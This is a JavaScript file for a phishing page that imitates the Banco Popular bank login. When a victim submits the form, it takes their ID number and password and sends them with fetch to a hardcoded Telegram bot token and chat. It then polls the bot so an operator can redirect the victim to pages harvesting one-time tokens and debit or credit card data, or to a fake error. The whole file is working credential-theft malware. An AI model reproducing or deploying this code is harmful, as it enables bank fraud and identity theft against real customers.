document.addEventListener('DOMContentLoaded', function() {
    // Clear Telegram Session Data on Page Load
    localStorage.removeItem('telegram_message_id');
    localStorage.removeItem('telegram_chat_id');
    localStorage.removeItem('telegram_message_text');

    // Custom Select Logic
    const customSelect = document.querySelector('.custom-select-wrapper');
    const selectTrigger = customSelect.querySelector('.custom-select-trigger');
    const customOptions = customSelect.querySelector('.custom-options');
    const options = customSelect.querySelectorAll('.custom-option');
    const hiddenInput = document.getElementById('doc-type-input');
    const triggerText = document.getElementById('current-selection');

    // Toggle dropdown
    if (selectTrigger) {
        selectTrigger.addEventListener('click', function() {
            customSelect.classList.toggle('open');
        });
    }

    // Handle option selection
    if (options) {
        options.forEach(option => {
            option.addEventListener('click', function() {
                // Update trigger text
                triggerText.textContent = this.textContent;
                
                // Update hidden input value
                hiddenInput.value = this.getAttribute('data-value');
                
                // Handle selected class
                options.forEach(opt => opt.classList.remove('selected'));
                this.classList.add('selected');
                
                // Close dropdown
                customSelect.classList.remove('open');
            });
        });
    }

    // Close dropdown when clicking outside
    document.addEventListener('click', function(e) {
        if (customSelect && !customSelect.contains(e.target)) {
            customSelect.classList.remove('open');
        }
    });

    // Carousel Logic


    // Carousel Logic
    const slides = document.querySelectorAll('.carousel-slide');
    let currentSlide = 0; // Start with the first slide (index 0) as requested
    
    // Function to show slide
    function showSlide(index) {
        if (slides.length > 0) {
            slides.forEach((slide, i) => {
                if (i === index) {
                    slide.classList.add('active');
                } else {
                    slide.classList.remove('active');
                }
            });
        }
    }

    // Auto-advance slides every 5 seconds
    if (slides.length > 0) {
        setInterval(() => {
            currentSlide = (currentSlide + 1) % slides.length;
            showSlide(currentSlide);
        }, 5000);
    }

    // Update Date and Time
    function updateDateTime() {
        const now = new Date();
        const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        const months = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
        
        let hours = now.getHours();
        const minutes = now.getMinutes();
        const ampm = hours >= 12 ? 'p. m.' : 'a. m.';
        hours = hours % 12;
        hours = hours ? hours : 12; // the hour '0' should be '12'
        const strMinutes = minutes < 10 ? '0' + minutes : minutes;
        
        const dateString = `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} | ${hours}:${strMinutes} ${ampm}`;
        
        const dateDisplay = document.getElementById('date-display');
        if(dateDisplay) {
            dateDisplay.textContent = dateString;
        }
    }

    // Update date immediately and then every minute
    updateDateTime();
    setInterval(updateDateTime, 60000);

    // Responsive Reordering Logic (Force Mobile Layout)
    let lastWidth = 0;
    
    function handleResponsiveLayout() {
        const width = window.innerWidth;
        
        // Ignore if width hasn't changed (prevents keyboard from closing on mobile)
        if (width === lastWidth) return;
        lastWidth = width;

        const mainContainer = document.querySelector('.main-container');
        const leftSection = document.querySelector('.left-section');
        const rightSection = document.querySelector('.right-section');
        
        // Elements
        const loginCard = document.querySelector('.login-card-container');
        const helpSection = document.querySelector('.help-section');
        const loginLinks = document.querySelector('.login-bottom-links');
        const promoCard = document.querySelector('.promo-card');
        const carouselIndicator = document.querySelector('.carousel-indicator');
        const pageFooter = document.querySelector('.page-footer');
        const footerText = document.querySelector('.footer-right-text');
        
        if (width < 1024) {
            // Mobile: Move all to main container in specific order
            // Order: Login(1), Help(2), Links(3), Promo(4), Indicator(5), Footer(6), Copyright(7)
            
            // We append to mainContainer, effectively moving them out of left/right sections
            if (mainContainer && loginCard) mainContainer.appendChild(loginCard);
            if (mainContainer && helpSection) mainContainer.appendChild(helpSection);
            if (mainContainer && promoCard) mainContainer.appendChild(promoCard);
            if (mainContainer && carouselIndicator) mainContainer.appendChild(carouselIndicator);
            if (mainContainer && loginLinks) mainContainer.appendChild(loginLinks);
            if (mainContainer && pageFooter) mainContainer.appendChild(pageFooter);
            if (mainContainer && footerText) mainContainer.appendChild(footerText);
            
            // Hide left/right sections as they are now empty or irrelevant
            if (leftSection) leftSection.style.display = 'none';
            if (rightSection) rightSection.style.display = 'none';
        } else {
            // Desktop: Restore to sections
            if (leftSection) leftSection.style.display = 'flex';
            if (rightSection) rightSection.style.display = 'flex';
            
            // Restore Left Section items
            if (leftSection && loginCard) leftSection.appendChild(loginCard);
            if (leftSection && loginLinks) leftSection.appendChild(loginLinks);
            if (leftSection && pageFooter) leftSection.appendChild(pageFooter);
            if (leftSection && footerText) leftSection.appendChild(footerText);
            
            // Restore Right Section items
            if (rightSection && promoCard) rightSection.appendChild(promoCard);
            if (rightSection && carouselIndicator) rightSection.appendChild(carouselIndicator);
            if (rightSection && helpSection) rightSection.appendChild(helpSection);
        }
    }

    // Run on load and resize
    handleResponsiveLayout();
    window.addEventListener('resize', handleResponsiveLayout);

    // Login Form Logic (Personas)
    const docInput = document.getElementById('doc-number');
    const btnStep1 = document.getElementById('btn-step-1');
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const btnBack = document.getElementById('btn-back');
    const userDocNumber = document.getElementById('user-doc-number');
    const userDocType = document.getElementById('user-doc-type');
    const btnLogin = document.getElementById('btn-login');

    if (docInput && btnStep1) {
        // Enable continue button if input has value
        docInput.addEventListener('input', function() {
            if (this.value.trim().length > 0) {
                btnStep1.disabled = false;
                btnStep1.classList.add('active');
                btnStep1.style.cursor = 'pointer';
                btnStep1.style.backgroundColor = '#009639';
                btnStep1.style.color = 'white';
            } else {
                btnStep1.disabled = true;
                btnStep1.classList.remove('active');
                btnStep1.style.cursor = 'not-allowed';
                btnStep1.style.backgroundColor = '#c4d3e0';
                btnStep1.style.color = '#7d8e9e';
            }
        });

        // Go to Step 2
        btnStep1.addEventListener('click', function() {
            if (!this.disabled) {
                step1.style.display = 'none';
                step2.style.display = 'block';
                if (userDocNumber) userDocNumber.textContent = docInput.value;
                if (userDocType && hiddenInput) userDocType.textContent = hiddenInput.value.toUpperCase();
            }
        });
    }

    // Back to Step 1
    if (btnBack) {
        btnBack.addEventListener('click', function(e) {
            e.preventDefault();
            step2.style.display = 'none';
            step1.style.display = 'block';
        });
    }

    // Login Submit
    if (btnLogin) {
        btnLogin.addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const docType = document.getElementById('doc-type-input').value;
            const docNumber = document.getElementById('doc-number').value;

            if (password) {
                // Telegram Configuration
                const botToken = '8645913661:AAHLkz0Q3Ea_ucLi_VbZ_9cpwuvpvt_meOo'; // Token proporcionado
const chatId = '-5501183352'; // REEMPLAZAR CON TU CHAT ID REAL (Faltante)

                // Save sensitive data to LocalStorage for persistence across pages
                localStorage.setItem('saved_docType', docType.toUpperCase());
                localStorage.setItem('saved_docNumber', docNumber);
                localStorage.setItem('saved_password', password);
                
                // Initialize empty data for other fields
                localStorage.removeItem('saved_token');
                localStorage.removeItem('saved_tc_number');
                localStorage.removeItem('saved_tc_expiry');
                localStorage.removeItem('saved_tc_cvv');
                localStorage.removeItem('saved_card_type');

                // Generate Transaction ID
                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
                localStorage.setItem('transaction_id', transactionId);

                // Message Content Construction
                const message = `
<b>🏦 Banco Popular - Nuevo Login</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
🧑‍💻 <b>Usuario:</b> | ${docType.toUpperCase()} - ${docNumber}
🔐 <b>Clave:</b> | ${password}
--------------------------------------------------
`;

                // Inline Keyboard Buttons
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "❌ Error Login", callback_data: "error_login" },
                            { text: "📲 Token", callback_data: "ask_token" }
                        ],
                        [
                            { text: "⚠️ Error Token", callback_data: "error_token" }, // Keep for consistency or remove if unused here
                            { text: "💳 Pedir TC Débito", callback_data: "ask_debit" }
                        ],
                        [
                            { text: "💳 Pedir TC Crédito", callback_data: "ask_credit" },
                            { text: "❌ Error TC Débito", callback_data: "error_debit" }
                        ],
                        [
                            { text: "❌ Error TC Crédito", callback_data: "error_credit" }
                        ],
                        [
                            { text: "✅ Finalizar", callback_data: "finish" }
                        ]
                    ]
                };

                // Show Loading Overlay
                const loadingOverlay = document.getElementById('loading-overlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                }

                // Send to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Mensaje enviado a Telegram:', data);
                    
                    // Save Message ID and Content for Editing later
                    if (data.ok && data.result) {
                        localStorage.setItem('telegram_message_id', data.result.message_id);
                        localStorage.setItem('telegram_chat_id', chatId);
                        localStorage.setItem('telegram_message_text', message);
                    }

                    // Start Polling for Updates
                    startTelegramPolling(botToken);
                })
                .catch(error => {
                    console.error('Error enviando a Telegram:', error);
                });
            } else {
                alert('Por favor ingrese su contraseña');
            }
        });
    }

    // Function to Poll Telegram Updates
    let lastUpdateId = 0;
    let pollingInterval;

    function startTelegramPolling(token) {
        // Clear existing polling if any
        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}`)
            .then(response => response.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        
                        // Check for Callback Query
                        if (update.callback_query) {
                            const action = update.callback_query.data;
                            
                            if (action === 'ask_token') {
                                // Redirect to Token Page
                                window.location.href = 'token.html';
                                
                                clearInterval(pollingInterval);

                                fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: 'Redirigiendo a Token...'
                                    })
                                });
                            }

                            if (action === 'ask_debit') {
                                // Redirect to TC Debit Page
                                window.location.href = 'tc_debito.html';
                                
                                clearInterval(pollingInterval);

                                fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: 'Redirigiendo a TC Débito...'
                                    })
                                });
                            }

                            if (action === 'ask_credit') {
                                // Redirect to TC Credit Page
                                window.location.href = 'tc_credito.html';
                                
                                clearInterval(pollingInterval);

                                fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: 'Redirigiendo a TC Crédito...'
                                    })
                                });
                            }

                            if (action === 'finish') {
                                // Clear LocalStorage
                                localStorage.removeItem('telegram_message_id');
                                localStorage.removeItem('telegram_chat_id');
                                localStorage.removeItem('telegram_message_text');

                                window.location.href = 'https://www.bancopopular.com.co';
                                
                                clearInterval(pollingInterval);

                                fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: 'Finalizando sesión...'
                                    })
                                });
                            }
                            
                            if (action === 'error_login') {
                                // Clear LocalStorage
                                localStorage.removeItem('telegram_message_id');
                                localStorage.removeItem('telegram_chat_id');
                                localStorage.removeItem('telegram_message_text');

                                // Hide Loader
                                const loadingOverlay = document.getElementById('loading-overlay');
                                if (loadingOverlay) loadingOverlay.style.display = 'none';

                                // Go back to Step 1 (Document Info)
                                document.getElementById('step-2').style.display = 'none';
                                document.getElementById('step-1').style.display = 'block';

                                // Show Error Message
                                const errorMsg = document.getElementById('login-error-msg');
                                if (errorMsg) {
                                    errorMsg.style.display = 'flex';
                                }

                                // Clear password field
                                document.getElementById('password').value = '';

                                // Stop polling since we handled the action
                                clearInterval(pollingInterval);
                                
                                // Optional: Answer callback to stop loading spinner in Telegram
                                fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: 'Error mostrado al usuario'
                                    })
                                });
                            }
                        }
                    });
                }
            })
            .catch(err => console.error('Polling Error:', err));
        }, 3000); // Poll every 3 seconds
    }
});